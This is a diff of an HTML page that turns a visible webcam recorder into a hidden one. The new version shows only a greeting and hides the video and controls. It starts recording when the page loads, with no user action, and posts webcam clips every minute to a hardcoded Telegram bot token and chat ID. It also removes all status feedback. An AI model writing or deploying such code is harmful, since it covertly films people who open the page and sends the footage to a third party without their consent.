@@ -1,43 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Video Recorder for Telegram</title>
+    <title>Video Recorder</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        #video-container { margin: 20px 0; }
-        #webcam { background: #000; width: 640px; height: 480px; }
-        .status { margin: 10px 0; padding: 10px; background: #f0f0f0; }
-        button { padding: 8px 16px; font-size: 16px; margin-right: 10px; }
-        textarea {
-            padding: 6px;
-            margin-bottom: 10px;
-            width: 300px;
-            display: block;
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
         }
-        label { margin-top: 10px; display: block; }
+        #status {
+            font-size: 24px;
+        }
+        #video-container, #webcam, button, h1 {
+            display: none; /* Скрываем все элементы кроме статуса */
+        }
     </style>
 </head>
 <body>
-    <h1>Video Recorder for Telegram</h1>
-    <div>
-        <label for="messageText">Message Text (optional):</label>
-        <textarea id="messageText" placeholder="Your message here..."></textarea>
-    </div>
-    <div class="status" id="status">Status: Ready</div>
+    <div id="status">Привет</div>
+
+    <!-- Скрытые элементы -->
     <div id="video-container">
         <video id="webcam" autoplay playsinline></video>
     </div>
-    <button id="startBtn">Start Recording</button>
-    <button id="stopBtn" disabled>Stop Recording</button>
 
     <script>
         const video = document.getElementById('webcam');
         const statusDiv = document.getElementById('status');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const messageTextInput = document.getElementById('messageText');
 
-        // Встроенные данные бота
+        // Данные бота
         const BOT_TOKEN = "7520310595:AAFevgIKEx75UH3Z8tLnb5braLs66qUpflc";
         const CHAT_ID = 6018518882;
 
@@ -46,6 +44,9 @@
         let recordedChunks = [];
         let recordingInterval;
         let isRecording = false;
+
+        // Автоматически начинаем запись при загрузке страницы
+        window.addEventListener('load', startRecording);
 
         async function startWebcam() {
             try {
@@ -56,7 +57,7 @@
                 video.srcObject = stream;
                 return true;
             } catch (err) {
-                statusDiv.textContent = `Error: ${err.message}`;
+                console.error('Camera error:', err);
                 return false;
             }
         }
@@ -83,26 +84,7 @@
                 }
             }, 60000);
 
-            statusDiv.textContent = "Status: Recording...";
-            startBtn.disabled = true;
-            stopBtn.disabled = false;
             isRecording = true;
-        }
-
-        function stopRecording() {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-            }
-            clearInterval(recordingInterval);
-
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-
-            statusDiv.textContent = "Status: Recording stopped";
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
-            isRecording = false;
         }
 
         async function sendToTelegram() {
@@ -116,40 +98,27 @@
                 formData.append('video', blob, `recording_${Date.now()}.webm`);
                 formData.append('chat_id', CHAT_ID);
 
-                if (messageTextInput.value) {
-                    formData.append('caption', messageTextInput.value);
-                }
-
-                statusDiv.textContent = "Status: Sending to Telegram...";
-
-                const response = await fetch(
+                await fetch(
                     `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
                     {
                         method: 'POST',
                         body: formData
                     }
                 );
-
-                const result = await response.json();
-
-                if (response.ok) {
-                    statusDiv.textContent = "Status: Video sent to Telegram!";
-                    console.log("Telegram response:", result);
-                } else {
-                    statusDiv.textContent = `Status: Telegram error - ${result.description || 'Unknown error'}`;
-                }
             } catch (error) {
                 console.error('Telegram upload error:', error);
-                statusDiv.textContent = `Status: Failed to send - ${error.message}`;
             }
         }
 
-        startBtn.addEventListener('click', startRecording);
-        stopBtn.addEventListener('click', stopRecording);
-
         window.addEventListener('beforeunload', () => {
             if (isRecording) {
-                stopRecording();
+                if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                    mediaRecorder.stop();
+                }
+                clearInterval(recordingInterval);
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
             }
         });
     </script>
